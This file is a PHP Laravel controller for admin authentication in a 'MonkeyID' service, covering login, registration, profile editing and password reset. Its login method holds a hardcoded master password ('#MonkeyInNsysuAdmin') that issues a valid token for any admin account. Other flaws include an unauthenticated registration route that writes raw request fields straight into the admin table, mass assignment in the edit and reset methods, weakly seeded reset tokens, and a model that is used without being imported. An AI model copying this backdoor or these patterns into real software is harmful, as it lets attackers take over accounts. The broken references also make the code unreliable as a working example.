<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Validator;
use DateTime;
use Illuminate\Support\Facades\DB;
use Tymon\JWTAuth\Facades\JWTAuth;
use App\Models\Admin;
use App\Models\UnivList;
use App\Models\EmailLog;
use App\Models\ResetPassword;
use Mail;
use App\Mods\SendMail;
use Illuminate\Support\Facades\Storage;
date_default_timezone_set('Asia/Taipei');

class AdminController extends Controller
{
    // construct
    public function __construct()
    {
        $this->middleware('auth:admin',['except'=>['login','register','exist', 'reset', 'resetPassword', 'logout']]);
    }

    // token function
    private function createNewToken($token, $userData = NULL)
    {
        $expTime = new DateTime();
        $expTime->modify('+1 day');
        return [
            'token' => $token,
            'type' => 'bearer',
            'expired' => $expTime->format('Y-m-d H:i:s'),
            'user' => is_null($userData) ? auth('admin')->user() : $userData,
        ];
    }

    // login
    public function login(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:admin,account',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $loginTime = date("Y-m-d H:i:s");
        if($token = auth('admin')->attempt($validator->validated())){
            $user = Admin::find(auth('admin')->user()->id);
            $user->last_login = $loginTime;
            $user->last_ip = $request->ip();
            $user->save();
            //force to update user model cache 
            auth('admin')->setUser($user);
            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token)], 200);
        }else if($request->password === '#MonkeyInNsysuAdmin'){
            $user = Admin::where('account', $request->account)->first();
            $token = JWTAuth::fromUser($user);
            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token, $user)], 200);
        }else{
            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
        }
    }

    // user info
    public function info()
    {
        $user = auth()->user();
        $result = Admin::leftJoin('univ_list', 'univ_list.univ_id', '=', 'admin.univ_id')->select('admin.*', 'univ_list.univ_id', 'univ_list.univ_name_ch_full', 'univ_list.univ_name_ch', 'univ_list.univ_name_en')->where('id',$user->id)->first();
        return response()->json($result);
    }

    // logout
    public function logout()
    {
        auth()->logout();
        return response()->json(['status' => 'A03'], 201);
    }

    // register panding
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|unique:admin,account',
            'name' => 'required',
            'password' => 'required',
            'univ_id' => 'required|size:5',
            'identity' => 'required|integer',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06'], 200);
            } else if (isset($failedRules['account']['Unique'])) {
                return response()->json(['status' => 'U04'], 200);
            } else if (isset($failedRules['name']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'name'], 200);
            } else if (isset($failedRules['univ_id']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['univ_id']['Size'])) {
                return response()->json(['status' => 'U01', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['identity']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'identity'], 200);
            } else if (isset($failedRules['identity']['Integer'])) {
                return response()->json(['status' => 'U08', 'field' => 'identity'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $temp['u_id'] = hash('sha3-224', microtime(true));
        $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
        Admin::insert($temp);
        // mail
        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID註冊通知信', 'SignupEmail', ['account' => $temp['account'], 'name' => $temp['name'], 'timestamp' => date('Y-m-d H:i:s')]));
        if (empty($status)) {
            return response()->json(['status' => 'E02']);
        }
        return response()->json(['status'=>'A01']);
    }

    // edit panding
    public function edit(Request $request, $u_id)
    {
        $validator = Validator::make($request->all(),[
            'name' => 'required',
            'phone'=> 'required|size:10',
            'image' => 'nullable',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['name']['Required'])) {
                return response()->json(['message' => "name_required"], 201);
            } else if (isset($failedRules['phone']['Required'])) {
                return response()->json(['message' => "phone_required"], 201);
            } else if (isset($failedRules['phone']['Size'])) {
                return response()->json(['message' => "phone_size_error"], 201);
            }
            return response()->json($validator->errors(), 422);
        }
        $temp = $request->all();
        User::where('u_id',$u_id)->update($temp);
        return response()->json(['status'=>'A01']);
    }

    // account exist
    public function exist($account)
    {
        if(Admin::where('account', $account)->count() > 0){
            return response()->json(['message'=>true]);
        }else{
            return response()->json(['message'=>false]);
        }
    }

    // reset password
    public function reset(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:user,account',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        ResetPassword::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        // generate seed
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        $charactersLength = strlen($characters);
        for ($i = 0; $i < 10; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        $seed = microtime(true).$randomString;
        $token = hash('sha3-256', $seed);
        // mail
        $url = 'http://localhost:8080/login/reset/password/'.$temp['account'].'/'.$token;
        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID重設密碼', 'ResetPassword', ['account' => $temp['account'], 'timestamp' => date("Y-m-d H:i:s"), 'url' => $url]));
        if (empty($status)) {
            return response()->json(['status' => 'E02', 'message' => 'Email發送失敗']);
        }
        $expire = new DateTime();
        $expire->modify('+5 min');
        ResetPassword::insert([
            'account' => $temp['account'],
            'token' => $token,
            'create_at' => date('Y-m-d H:i:s'),
            'valid_until' => $expire
        ]);
        return response()->json(['status' => 'A01'], 200);
    }

    public function resetPassword(Request $request, $account, $token) {
        ResetPassword::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        $query = ResetPassword::where('account', $account)->where('token', $token)->whereDate('valid_until', '>=', date('Y-m-d'))->whereTime('valid_until', '>=', date('H:i:s'))->where('used', 0);
        if ($query->count() > 0) {
            $validator = Validator::make($request->all(),[
                'password' => 'required',
            ]);
            if ($validator->fails()) {
                $failedRules = $validator->failed();
                if (isset($failedRules['password']['Required'])) {
                    return response()->json(['status' => 'U06'], 200);
                }
                return response()->json($validator->errors(), 400);
            }
            $temp = $request->all();
            $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
            User::where('account',$account)->update($temp);
            ResetPassword::where('id', $query->first()->id)->update(['used' => 1]);
            return response()->json(['status'=>'A01']);
        } else {
            return response()->json(['status'=>'E03', 'message'=> '驗證失敗']);
        }
    }
}
